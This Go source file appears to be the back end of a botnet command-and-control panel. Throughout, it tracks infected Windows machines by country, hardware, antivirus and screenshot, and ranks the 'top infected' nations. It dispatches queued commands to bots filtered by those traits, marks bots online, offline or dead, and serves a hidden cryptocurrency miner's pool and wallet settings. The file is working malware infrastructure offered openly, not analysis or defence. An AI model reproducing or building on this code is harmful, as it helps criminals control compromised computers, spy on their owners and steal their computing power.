package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"strings"
	"time"

	"golang.org/x/crypto/bcrypt"
)

const letterBytes = "abcdefghijklmnopqrstuvwxyz0123456789"

func getImageByID(pcname string) ([]byte, error) {
	var imageData []byte
	query := "SELECT screenshot FROM bots WHERE pcname = ?"
	err := db.QueryRow(query, pcname).Scan(&imageData)
	return imageData, err
}

func GetNationInfo() []GEO {
	geopie := []GEO{}
	geopies := GEO{}
	georow, err := db.Query("SELECT nation,COUNT(*) as cnt FROM bots GROUP BY nation ORDER BY cnt DESC;")
	if err != nil {
		log.Fatal(err)
	}
	for georow.Next() {
		err := georow.Scan(&geopies.Geo, &geopies.Cnt)
		if err != nil {
			log.Fatal(err)
		}
		geopie = append(geopie, geopies)
	}
	return geopie
}

func GetOSInfo() []OP {
	oppie := []OP{}
	oppies := OP{}
	oprow, err := db.Query("SELECT os, COUNT(*) AS `cnt` FROM bots GROUP BY os;")
	if err != nil {
		log.Fatal(err)
	}
	for oprow.Next() {
		err := oprow.Scan(&oppies.OS, &oppies.Cnt)
		if err != nil {
			log.Fatal(err)
		}
		oppie = append(oppie, oppies)
	}
	return oppie
}

func GetGPUInfo() []GPU {
	gpupie := []GPU{}
	gpupies := GPU{}
	oprow, err := db.Query("SELECT gpu, COUNT(*) AS `cnt` FROM bots GROUP BY gpu;")
	if err != nil {
		log.Fatal(err)
	}
	for oprow.Next() {
		err := oprow.Scan(&gpupies.Gpu, &gpupies.Cnt)
		if err != nil {
			log.Fatal(err)
		}
		gpupie = append(gpupie, gpupies)
	}
	return gpupie
}

func GetCPUInfo() []CPU {
	cpupie := []CPU{}
	cpupies := CPU{}
	oprow, err := db.Query("SELECT cpu, COUNT(*) AS `cnt` FROM bots GROUP BY cpu;")
	if err != nil {
		log.Fatal(err)
	}
	for oprow.Next() {
		err := oprow.Scan(&cpupies.Cpu, &cpupies.Cnt)
		if err != nil {
			log.Fatal(err)
		}
		cpupie = append(cpupie, cpupies)
	}
	return cpupie
}

func GetBotInfo() []BotIntCnt {
	botcnt := []BotCnt{}
	botcnts := BotCnt{}
	botrow, err := db.Query("SELECT COUNT(*) FILTER (WHERE status = 'online') as online, COUNT(*) FILTER (WHERE status = 'offline') as offline, COUNT(*) FILTER (WHERE status = 'dead') as dead FROM bots;")
	if err != nil {
		log.Fatal(err)
	}
	for botrow.Next() {
		err := botrow.Scan(&botcnts.Online, &botcnts.Offline, &botcnts.Dead)
		if err != nil {
			log.Fatal(err)
		}
		botcnt = append(botcnt, botcnts)
	}
	botIntCnt := []BotIntCnt{}
	for _, element := range botcnt {
		botIntCnt = append(botIntCnt, BotIntCnt(element.Online))
		botIntCnt = append(botIntCnt, BotIntCnt(element.Offline))
		botIntCnt = append(botIntCnt, BotIntCnt(element.Dead))
	}
	return botIntCnt
}

func GetTotalBots() []BotCount {
	botsquery, err := db.Query(`SELECT COUNT(pcname) as total FROM BOTS`)
	if err != nil {
		log.Fatal(err)
	}
	defer func() {
		if err := botsquery.Close(); err != nil {

			log.Fatal(err)
		}
	}()
	var splice []BotCount
	for botsquery.Next() {
		var info BotCount
		err := botsquery.Scan(&info.Count)
		if err != nil {

			log.Fatal(err)
		}
		splice = append(splice, info)
	}
	return splice
}

func GetOnlineBots() []BotCount {
	botsquery, err := db.Query(`SELECT COUNT(pcname) as total FROM BOTS WHERE status="online"`)
	if err != nil {
		log.Fatal(err)
	}
	defer func() {
		if err := botsquery.Close(); err != nil {

			log.Fatal(err)
		}
	}()
	var splice []BotCount
	for botsquery.Next() {
		var info BotCount
		err := botsquery.Scan(&info.Count)
		if err != nil {

			log.Fatal(err)
		}
		splice = append(splice, info)
	}
	return splice
}

func GetOfflineBots() []BotCount {
	botsquery, err := db.Query(`SELECT COUNT(pcname) as total FROM BOTS WHERE status="offline"`)
	if err != nil {
		log.Fatal(err)
	}
	defer func() {
		if err := botsquery.Close(); err != nil {

			log.Fatal(err)
		}
	}()
	var splice []BotCount
	for botsquery.Next() {
		var info BotCount
		err := botsquery.Scan(&info.Count)
		if err != nil {

			log.Fatal(err)
		}
		splice = append(splice, info)
	}
	return splice
}

func GetDeadBots() []BotCount {
	botsquery, err := db.Query(`SELECT COUNT(pcname) as total FROM BOTS WHERE status="dead"`)
	if err != nil {
		log.Fatal(err)
	}
	defer func() {
		if err := botsquery.Close(); err != nil {

			log.Fatal(err)
		}
	}()
	var splice []BotCount
	for botsquery.Next() {
		var info BotCount
		err := botsquery.Scan(&info.Count)
		if err != nil {

			log.Fatal(err)
		}
		splice = append(splice, info)
	}
	return splice
}
func (b GEO) MakeGeoJSON(tables []GEO) string {
	m := make(map[string]int)

	for i := range tables {
		m[tables[i].Geo] += tables[i].Cnt
	}
	botsJson, err := json.Marshal(m)
	if err != nil {
		return ""
	}

	return string(botsJson)
}

func MakeMap() string {
	geomap := []GEO{}
	geomaps := GEO{}
	georow, err := db.Query("SELECT nation as geo,COUNT(*) as cnt FROM Bots GROUP BY nation;")
	if err != nil {
		log.Fatal(err)
	}
	for georow.Next() {
		err := georow.Scan(&geomaps.Geo, &geomaps.Cnt)
		if err != nil {
			log.Fatal(err)
		}
		geomap = append(geomap, geomaps)
	}
	return geomaps.MakeGeoJSON(geomap)
}

func TopInfected() []GEO {
	botsquery, err := db.Query(`SELECT lower(nation) as geo, COUNT(*) as cnt FROM Bots GROUP BY nation ORDER BY cnt DESC limit 6;`)
	if err != nil {
		log.Fatal(err)
	}
	defer func() {
		if err := botsquery.Close(); err != nil {

			log.Fatal(err)
		}
	}()
	var splice []GEO
	for botsquery.Next() {
		var info GEO
		err := botsquery.Scan(&info.Geo, &info.Cnt)
		if err != nil {

			log.Fatal(err)
		}
		splice = append(splice, info)
	}
	return splice
}

func CheckData(data WinSystemInfo) bool {
	if data.IP == "" || len(data.IP) > 150 {
		return false
	}
	if data.Nation == "" || len(data.Nation) > 150 {
		return false
	}
	if data.CPU == "" || len(data.CPU) > 150 {
		return false
	}
	if data.GPU == "" || len(data.GPU) > 150 {
		return false
	}
	if data.Antivirus == "" || len(data.Antivirus) > 150 {
		return false
	}
	if data.PCName == "" || len(data.PCName) > 150 {
		return false
	}

	return true
}

func PrettyPrintJSON(input string) string {
	var prettyJSON bytes.Buffer
	err := json.Indent(&prettyJSON, []byte(input), "", "  ")
	if err != nil {
		return ""
	}
	return prettyJSON.String()
}

func GetTasks() []Task {
	taskinfo := []Task{}
	taskinfoquery, err := db.Query("SELECT `tid`,`command`,`parameter`,`filtermethod`,`filter`,`wanted_executions`,`current_executions`, `created`, `status` FROM tasks;")
	if err != nil {
		log.Fatal(err)
	}
	taskinfos := Task{}
	for taskinfoquery.Next() {
		err := taskinfoquery.Scan(&taskinfos.Tid, &taskinfos.Command, &taskinfos.Parameter, &taskinfos.FilterMethod, &taskinfos.Filter, &taskinfos.WantedExec, &taskinfos.CurrentExec, &taskinfos.Created, &taskinfos.Status)
		if err != nil {
			log.Fatal(err)
		}
		taskinfo = append(taskinfo, taskinfos)
	}
	return taskinfo
}

func BotExists(pcname string) bool {
	botsquery, err := db.Query(`SELECT COUNT(pcname) as total FROM BOTS WHERE pcname=?`, pcname)
	if err != nil {
		log.Fatal(err)
	}
	defer func() {
		if err := botsquery.Close(); err != nil {

			log.Fatal(err)
		}
	}()
	var splice []BotCount
	for botsquery.Next() {
		var info BotCount
		err := botsquery.Scan(&info.Count)
		if err != nil {

			log.Fatal(err)
		}
		splice = append(splice, info)
	}

	return splice[0].Count > 0
}

func CheckTasks(data WinSystemInfo) string {
	db.Exec(`UPDATE bots SET status="offline" WHERE lastcon < strftime('%s', 'now') - 360 AND lastcon > strftime('%s', 'now') - 259200`)
	db.Exec(`UPDATE bots SET status="dead" WHERE lastcon < strftime('%s', 'now') - 259200`)
	single := CheckSingleTasks(data.PCName)
	//mass := CheckNoFilterTasks(botbody)
	filter := CheckFilterTasks(data)

	if single != "no" {
		return single
	} else if filter != "no" {
		return filter
	} else {
		return "FALLEN|NOTASK"
	}
}

func GetConfig() []Config {
	configinfo := []Config{}
	configquery, err := db.Query("SELECT `pool`,`address`,`password`,`threads`,`idle_time`,`idle_threads` FROM minerconfig;")
	if err != nil {
		log.Fatal(err)
	}
	configinfos := Config{}
	for configquery.Next() {
		err := configquery.Scan(&configinfos.Pool, &configinfos.Address, &configinfos.Password, &configinfos.Threads, &configinfos.IdleTime, &configinfos.IdleThreads)
		if err != nil {
			log.Fatal(err)
		}
		configinfo = append(configinfo, configinfos)
	}
	return configinfo

}

func generateMathProblem() (string, int) {
	operators := []string{"+", "-", "*"}
	operand1 := rand.Intn(10) + 1
	operand2 := rand.Intn(10) + 1
	operator := operators[rand.Intn(len(operators))]

	problem := fmt.Sprintf("%d %s %d", operand1, operator, operand2)

	var answer int
	switch operator {
	case "+":
		answer = operand1 + operand2
	case "-":
		answer = operand1 - operand2
	case "*":
		answer = operand1 * operand2
	}

	return problem, answer
}

func CheckSingleTasks(pcname string) string {
	taskinfo := []Task{}
	taskinfoquery, err := db.Query(`SELECT tid,command,parameter FROM tasks WHERE status="active" AND filtermethod="single" AND filter=? AND status="active" ORDER by created+0 ASC LIMIT 1;`, pcname)
	if err != nil {
		log.Fatal(err)
	}
	taskinfos := Task{}
	for taskinfoquery.Next() {
		err := taskinfoquery.Scan(&taskinfos.Tid, &taskinfos.Command, &taskinfos.Parameter)
		if err != nil {
			log.Fatal(err)
		}
		taskinfo = append(taskinfo, taskinfos)
	}

	if len(taskinfo) > 0 {

		completedtaskinfo := []Task{}
		completedtaskrow, err := db.Query("SELECT tid,pcname FROM completed_tasks WHERE tid=? AND pcname=? LIMIT 1;", taskinfo[0].Tid, pcname)
		if err != nil {
			log.Fatal(err)
		}
		for completedtaskrow.Next() {
			var task Task
			err := completedtaskrow.Scan(&task.Tid, &task.PCName)
			if err != nil {
				log.Fatal(err)
			}
			completedtaskinfo = append(completedtaskinfo, task)
		}

		if len(completedtaskinfo) == 0 {
			if taskinfo[0].Command == "remove" {
				_, err := db.Exec("DELETE FROM bots WHERE pcname=?", pcname)
				if err != nil {
					log.Fatal(err.Error())
				}
			}
		}
		if len(completedtaskinfo) == 0 {
			_, err = db.Exec("UPDATE tasks SET current_executions=current_executions+1 WHERE tid=?", taskinfo[0].Tid)
			if err != nil {
				log.Fatal(err)
			}
			_, err = db.Exec("UPDATE tasks SET status='complete' WHERE current_executions = wanted_executions")
			if err != nil {
				log.Fatal(err)
			}
			_, err = db.Exec("INSERT INTO completed_tasks(tid,pcname,date) VALUES(?,?,?)", taskinfo[0].Tid, pcname, time.Now().Unix())
			if err != nil {
				log.Fatal(err)
			}
			return "FALLEN|" + taskinfo[0].Command + "|" + taskinfo[0].Parameter
		}

	}

	return "no"

}

func CheckNoFilterTasks(data WinSystemInfo) string {
	taskinfo := []Task{}
	taskinfoquery, err := db.Query(`SELECT tid, command, parameter, filtermethod FROM tasks WHERE (filtermethod IS NULL OR filtermethod = '') AND status = 'active' AND filtermethod != 'single' ORDER BY created+0 ASC`)
	if err != nil {
		log.Fatal(err)
	}
	taskinfos := Task{}
	for taskinfoquery.Next() {
		err := taskinfoquery.Scan(&taskinfos.Tid, &taskinfos.Command, &taskinfos.Parameter, &taskinfos.FilterMethod)
		if err != nil {
			log.Fatal(err)
		}

		taskinfo = append(taskinfo, taskinfos)
	}
	if len(taskinfo) > 0 {

		completedtaskinfo := []Task{}
		completedtaskrow, err := db.Query("SELECT tid,pcname FROM Completed_Tasks WHERE tid=? AND pcname=? LIMIT 1;", taskinfo[0].Tid, data.PCName)
		if err != nil {
			log.Fatal(err)
		}
		for completedtaskrow.Next() {
			var task Task
			err := completedtaskrow.Scan(&task.Tid, &task.PCName)
			if err != nil {
				log.Fatal(err)
			}
			completedtaskinfo = append(completedtaskinfo, task)
		}

		if len(completedtaskinfo) == 0 {

			if taskinfo[0].Command == "remove" {
				_, err := db.Exec("UPDATE tasks SET current_executions=current_executions+1 WHERE tid=?", taskinfo[0].Tid)
				if err != nil {
					log.Fatal(err)
				}
				_, err = db.Exec("UPDATE tasks SET status='complete' WHERE current_executions = wanted_executions")
				if err != nil {
					log.Fatal(err)
				}
				_, err = db.Exec("INSERT INTO completed_tasks(tid,pcname,date) VALUES(?,?,?)", taskinfo[0].Tid, data.PCName, time.Now().Unix())
				if err != nil {
					log.Fatal(err)
				}
				_, err = db.Exec("DELETE FROM bots WHERE pcname=?", data.PCName)
				if err != nil {
					log.Fatal(err)
				}
				return "FALLEN|" + taskinfo[0].Command + "|" + taskinfo[0].Parameter
			} else {
				_, err = db.Exec("UPDATE tasks SET current_executions=current_executions+1 WHERE tid=?", taskinfo[0].Tid)
				if err != nil {
					log.Fatal(err)
				}
				_, err = db.Exec("UPDATE tasks SET status='complete' WHERE current_executions = wanted_executions")
				if err != nil {
					log.Fatal(err)
				}
				_, err = db.Exec("INSERT INTO completed_tasks(tid,pcname,date) VALUES(?,?,?)", taskinfo[0].Tid, data.PCName, time.Now().Unix())
				if err != nil {
					log.Fatal(err)
				}

				return "FALLEN|" + taskinfo[0].Command + "|" + taskinfo[0].Parameter
			}

		}
	}
	return "no"
}

func CheckFilterTasks(data WinSystemInfo) string {
	taskinfo := []Task{}
	taskinfoquery, err := db.Query(`SELECT tid, command, parameter, filtermethod FROM tasks WHERE ((filtermethod IS NULL OR filtermethod = '') OR (filtermethod IN ('nation', 'cpu', 'gpu', 'os', 'av') AND ((filtermethod = 'nation' AND filter LIKE '%' || ? || '%') OR (filtermethod = 'cpu' AND ? LIKE '%' || filter || '%') OR (filtermethod = 'gpu' AND ? LIKE '%' || filter || '%') OR (filtermethod = 'os' AND filter LIKE '%' || ? || '%') OR (filtermethod = 'av' AND ? LIKE '%' || filter || '%'))) AND status = 'active' AND filtermethod != 'single') ORDER BY created+0 ASC`, data.Nation, data.CPU, data.GPU, data.OS, data.Antivirus)
	if err != nil {
		log.Fatal(err)
	}
	taskinfos := Task{}
	for taskinfoquery.Next() {
		err := taskinfoquery.Scan(&taskinfos.Tid, &taskinfos.Command, &taskinfos.Parameter, &taskinfos.FilterMethod)
		if err != nil {
			log.Fatal(err)
		}
		completedtaskinfo := []Task{}
		completedtaskrow, err := db.Query("SELECT tid,pcname FROM Completed_Tasks WHERE tid=? AND pcname=? LIMIT 1;", taskinfos.Tid, data.PCName)
		if err != nil {
			log.Fatal(err)
		}
		for completedtaskrow.Next() {
			var task Task
			err := completedtaskrow.Scan(&task.Tid, &task.PCName)
			if err != nil {
				log.Fatal(err)
			}
			completedtaskinfo = append(completedtaskinfo, task)
		}
		if len(completedtaskinfo) == 0 {
			taskinfo = append(taskinfo, taskinfos)
		}

	}
	if len(taskinfo) > 0 {
		if taskinfo[0].Command == "remove" {
			_, err := db.Exec("UPDATE tasks SET current_executions=current_executions+1 WHERE tid=?", taskinfo[0].Tid)
			if err != nil {
				log.Fatal(err)
			}
			_, err = db.Exec("UPDATE tasks SET status='complete' WHERE current_executions = wanted_executions")
			if err != nil {
				log.Fatal(err)
			}
			_, err = db.Exec("INSERT INTO completed_tasks(tid,pcname,date) VALUES(?,?,?)", taskinfo[0].Tid, data.PCName, time.Now().Unix())
			if err != nil {
				log.Fatal(err)
			}
			_, err = db.Exec("DELETE FROM bots WHERE pcname=?", data.PCName)
			if err != nil {
				log.Fatal(err)
			}
			return "FALLEN|" + taskinfo[0].Command + "|" + taskinfo[0].Parameter
		} else {
			_, err = db.Exec("UPDATE tasks SET current_executions=current_executions+1 WHERE tid=?", taskinfo[0].Tid)
			if err != nil {
				log.Fatal(err)
			}
			_, err = db.Exec("UPDATE tasks SET status='complete' WHERE current_executions = wanted_executions")
			if err != nil {
				log.Fatal(err)
			}
			_, err = db.Exec("INSERT INTO completed_tasks(tid,pcname,date) VALUES(?,?,?)", taskinfo[0].Tid, data.PCName, time.Now().Unix())
			if err != nil {
				log.Fatal(err)
			}
			return "FALLEN|" + taskinfo[0].Command + "|" + taskinfo[0].Parameter

		}
	}

	return "no"
}

func RandStringBytesRmndr(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Int63()%int64(len(letterBytes))]
	}
	return string(b)
}

func SpaceFieldsJoin(str string) string {
	return strings.Join(strings.Fields(str), "")
}

func HashPassword(password string) (string, error) {
	bytes, err := bcrypt.GenerateFromPassword([]byte(password), 14)
	return string(bytes), err
}

func CheckPasswordHash(password, hash string) bool {
	err := bcrypt.CompareHashAndPassword([]byte(hash), []byte(password))
	return err == nil
}
